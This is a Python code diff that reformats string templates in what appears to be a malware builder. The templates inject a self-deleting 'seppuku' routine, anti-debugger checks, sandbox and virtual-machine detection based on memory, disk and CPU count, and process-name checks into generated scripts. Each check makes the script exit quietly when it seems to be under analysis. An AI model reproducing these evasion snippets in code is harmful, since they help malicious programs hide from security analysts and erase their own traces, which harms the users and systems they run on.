@@ -1,9 +1,7 @@
 def python_seppuku():
-    d = '''
+    return '''
 def s():
-    os.remove(__file__)
-    '''
-    return d
+    os.remove(__file__)'''
 
 
 def python_anti_debug_checks():
@@ -11,8 +9,7 @@ def python_anti_debug_checks():
 def c_debug():
     if sys.gettrace() is not None or os.environ.get('USING_PDB') or os.environ.get('PYDEV_CONSOLE_ENCODING') or os.environ.get('PYDEVD_LOAD_VALUES_ASYNC'):
         sys.exit()
-c_debug()
-    '''
+c_debug()'''
 
 
 def python_specs_checks(os_name: str):
@@ -34,8 +31,7 @@ def c_specs():
     t_cpu = os.cpu_count()
     if t_mem < 4000 or t_dsk < 50000 or t_cpu <= 2:
         sys.exit()
-c_specs()
-    '''
+c_specs()'''
     return d
 
 
@@ -55,6 +51,5 @@ def c_proc():
         for sr in ss:
             if re.search(sr, pr, re.IGNORECASE):
                 sys.exit()
-c_proc()
-    '''
+c_proc()'''
     return d
